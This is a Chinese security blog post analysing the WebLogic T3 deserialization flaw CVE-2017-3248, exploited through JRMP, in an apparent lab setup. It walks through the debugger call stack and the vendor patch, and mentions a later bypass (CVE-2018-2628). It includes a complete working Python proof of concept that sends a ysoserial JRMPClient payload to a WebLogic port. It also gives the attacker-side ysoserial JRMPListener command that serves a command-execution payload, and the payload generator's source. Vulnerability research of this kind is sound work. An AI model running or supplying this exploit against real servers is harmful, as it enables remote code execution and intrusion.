---
layout: default
author: @panicaII
date: 2020-02-06 22:34:00 +0800
---

# Weblogic T3反序列化之三： JRMP

## 0x00 背景

​	前面两篇文章分别介绍了CVE-2015-4852和其补丁绕过版本CVE-2016-0638。

​	其实CVE-2016-0638就是在CVE-2015-4852的基础上增加了一层反序列化，有点像二进制里面的壳，把payload攻击链都隐藏起来了，而程序执行的时候，杀毒软件只扫描了入口点处的代码，即壳代码，真正的攻击代码是由壳引导的。CVE-2016-0638引入的**StreamMessageImpl**就是壳。

​	本文介绍的利用JRMP协议执行T3反序列化漏洞其实也就是利用另一个反序列化的点，且同样也不在前面已设的补丁黑名单中。

​	

## 0x01 漏洞描述

​	如上节所述，这个漏洞（CVE-2017-3248）就是利用JRMP协议执行反序列化的一种方式。与前面漏洞不一样的是，这里引入了JRMP的概念，需要一台远程RMI服务器协同才能完成攻击。

## 0x02 漏洞调试

### 环境搭建

​	见**参考 3**：

  * Weblogic Docker启动

  * IDEA 调试

  * RMI服务器监听：java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "whoami"

  * PoC执行，见**0x03 PoC**

    关于docker的启动和IDEA的调试，这里就不说了。

### 调试

​	这里的调试分两部分介绍：

 1. RemoteObjectInvocationHandler

 2. RMI

    

    先看第一部分，PoC用到的反序列化点**RemoteObjectInvocationHandler**。

![image-20200206232141135](/images/Weblogic/image-20200206232141135.png)

​																		*信息 1*	

​	上述图片中，可以看到，这里和之前CVE-2015-4852的栈是一模一样的，只是这里的点是**RemoteObjectInvocationHandler**，而不是**AnnotationInvocationHandler**。

​	看名字也知道，这个跟远程有关系。确实，这里是JRMP，远程调用了。关于JRMP可以看看**参考 1** 。

​	需要搭建一个远程的RMI服务器，这是攻击者控制着的服务器，攻击者将payload放在上面，如下就是本文使用的RMI服务器，在1099端口跑了个监听服务.

```bash
(base) panicall@97:~/tools$ java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "whoami"
* Opening JRMP listener on 1099
Have connection from /172.19.0.2:45942
Reading message...
Is DGC call for [[0:0:0, -416083434]]
Sending return with payload for obj [0:0:0, 2]
Closing connection
```

​																		*信息 2*

​	可以看到RMI服务器已经向受害Weblogic主机发送了payload，我们看看受害的weblogic主机上完整的调用栈：

```
transform:119, InvokerTransformer (org.apache.commons.collections.functors)
transform:122, ChainedTransformer (org.apache.commons.collections.functors)
get:157, LazyMap (org.apache.commons.collections.map)
invoke:51, AnnotationInvocationHandler (sun.reflect.annotation)
entrySet:-1, $Proxy58 (com.sun.proxy)
readObject:328, AnnotationInvocationHandler (sun.reflect.annotation)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:39, NativeMethodAccessorImpl (sun.reflect)
invoke:25, DelegatingMethodAccessorImpl (sun.reflect)
invoke:597, Method (java.lang.reflect)
invokeReadObject:969, ObjectStreamClass (java.io)
readSerialData:1871, ObjectInputStream (java.io)
readOrdinaryObject:1775, ObjectInputStream (java.io)
readObject0:1327, ObjectInputStream (java.io)
defaultReadFields:1969, ObjectInputStream (java.io)
readSerialData:1893, ObjectInputStream (java.io)
readOrdinaryObject:1775, ObjectInputStream (java.io)
readObject0:1327, ObjectInputStream (java.io)
readObject:349, ObjectInputStream (java.io)
executeCall:225, StreamRemoteCall (sun.rmi.transport)
invoke:359, UnicastRef (sun.rmi.server)
dirty:-1, DGCImpl_Stub (sun.rmi.transport)
makeDirtyCall:342, DGCClient$EndpointEntry (sun.rmi.transport)
registerRefs:285, DGCClient$EndpointEntry (sun.rmi.transport)
registerRefs:121, DGCClient (sun.rmi.transport)
read:294, LiveRef (sun.rmi.transport)
readExternal:473, UnicastRef (sun.rmi.server)
readObject:438, RemoteObject (java.rmi.server)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:39, NativeMethodAccessorImpl (sun.reflect)
invoke:25, DelegatingMethodAccessorImpl (sun.reflect)
invoke:597, Method (java.lang.reflect)
invokeReadObject:969, ObjectStreamClass (java.io)
readSerialData:1871, ObjectInputStream (java.io)
readOrdinaryObject:1775, ObjectInputStream (java.io)
readObject0:1327, ObjectInputStream (java.io)
defaultReadFields:1969, ObjectInputStream (java.io)
readSerialData:1893, ObjectInputStream (java.io)
readOrdinaryObject:1775, ObjectInputStream (java.io)
readObject0:1327, ObjectInputStream (java.io)
readObject:349, ObjectInputStream (java.io)
readObject:66, InboundMsgAbbrev (weblogic.rjvm)
read:38, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
init:213, MsgAbbrevInputStream (weblogic.rjvm)
dispatch:498, MsgAbbrevJVMConnection (weblogic.rjvm)
dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3)
dispatch:387, BaseAbstractMuxableSocket (weblogic.socket)
readReadySocketOnce:967, SocketMuxer (weblogic.socket)
readReadySocket:899, SocketMuxer (weblogic.socket)
processSockets:130, PosixSocketMuxer (weblogic.socket)
run:29, SocketReaderRequest (weblogic.socket)
execute:42, SocketReaderRequest (weblogic.socket)
execute:145, ExecuteThread (weblogic.kernel)
run:117, ExecuteThread (weblogic.kernel)
```

​																		*信息 3*

​	这个栈有点长，但是消息非常完整和清晰。

1. **RemoteObjectInvocationHandler**的readObject被调用，其调用了**UnicastRef::readExternal**，参见**信息1**。
2. **UnicastRef::readExternal**一路向上，直接反序列化远程RMI服务器推送的payload。
![image-20200207001900877](/images/Weblogic/image-20200207001900877.png)

3. 而ConnectInputStream里面的内容就是RMI服务器推送的payload了，即ysoserial的CommonsCollections1。AnnotationInvocationHandler加Transformer，经典的payload，详情见第一篇文章。

## 0x03 PoC

​	PoC和前面CVE-2015-4852的很类似，是一个T3交互的框架代码+Payload。

​	框架代码是一样的，只是负责实现T3协议的握手和数据传输，这里仍然拷贝一下：

```python
#!/usr/bin/env python
# coding: utf-8

import socket
import struct
import time

def exp(host, port):

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    server_address = (host, int(port))
    data = ""
    try:
        sock.connect(server_address)
        # Send headers
        #headers = 't3 12.2.1nAS:255nHL:19nn'.format(port)
        #headers = bytes(headers, encoding = "utf8")
        #sock.sendall(headers)
        #time.sleep(1)
        #data = sock.recv(1024)

        xx = bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a')
        sock.send(xx)
        time.sleep(1)
        sock.recv(1024)

        # java -jar ysoserial.jar JRMPClient 172.16.100.97:1099 > ./jrmpclient1
        f = open('./jrmpclient1', 'rb')
        payload_obj = f.read()
        f.close()
        payload1 = "000005ba016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000"
        payload3 = "aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774b210000000000000000000d31302e3130312e3137302e3330000d31302e3130312e3137302e33300f0371a20000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771d01a621b7319cc536a1000a3137322e31392e302e32f7621bb50000000078"
        payload1=bytes.fromhex(payload1)
        payload3 = bytes.fromhex(payload3)
        payload2 = payload_obj
        payload = payload1 + payload2 + payload3

        payload = struct.pack('>I', len(payload)) + payload[4:]

        sock.send(payload)
        data = sock.recv(4096)
    except socket.error as e:
        print (u'socket 连接异常！')
    finally:
        sock.close()

exp('172.16.100.97', 7001)
```

​																					*信息 4*

​	payload使用ysoserial的JRMPClient1。

```
java -jar ysoserial.jar JRMPClient1 172.16.100.97:1099 > ./jrmpclient1
```



## 0x04 补丁

​	PoC用到了动态代理类：

```java
package ysoserial.payloads;


import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

@SuppressWarnings ( {
    "restriction"
} )
@PayloadTest( harness="ysoserial.test.payloads.JRMPReverseConnectSMTest")
@Authors({ Authors.MBECHLER })
public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry> {

    public Registry getObject ( final String command ) throws Exception {

        String host;
        int port;
        int sep = command.indexOf(':');
        if ( sep < 0 ) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {
            Registry.class
        }, obj);
        return proxy;
    }


    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());
        PayloadRunner.run(JRMPClient.class, args);
    }
}
```

​																						*信息 5*

​	动态代理类对应的接口类型是**java.rmi.registry.Registry**。

​	在**weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream**的**resolveProxyClass**中，添加了对接口类型的过滤：

```java
        protected Class<?> resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException {
            String[] var2 = interfaces;
            int var3 = interfaces.length;

            for(int var4 = 0; var4 < var3; ++var4) {
                String intf = var2[var4];
                if (intf.equals("java.rmi.registry.Registry")) {
                    throw new InvalidObjectException("Unauthorized proxy deserialization");
                }
            }

            return super.resolveProxyClass(interfaces);
        }
```

​																						*信息 6*

​	在上面函数处下个断点，再跑一下PoC：

![image-20200207220248202](/images/Weblogic/image-20200207220248202.png)

​	很明显，会被补丁拦截。

## 0x05 补丁绕过

​	CVE-2018-2628就是针对CVE-2017-3248补丁的绕过，利用方法完全相同，只是**java.rmi.activation.Activator**替换了**java.rmi.registry.Registry**。

## 0x06 参考

1. Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上） _https://paper.seebug.org/1091/

2. Remote Method Invocation (RMI) _https://www.oreilly.com/library/view/learning-java/1565927184/ch11s04.html

3. CVE-2017-3248&CVE-2018-2628 _https://blog.csdn.net/he_and/article/details/90580999

4. 动态代理类(翻译) _https://blog.csdn.net/oworkn/article/details/52200736

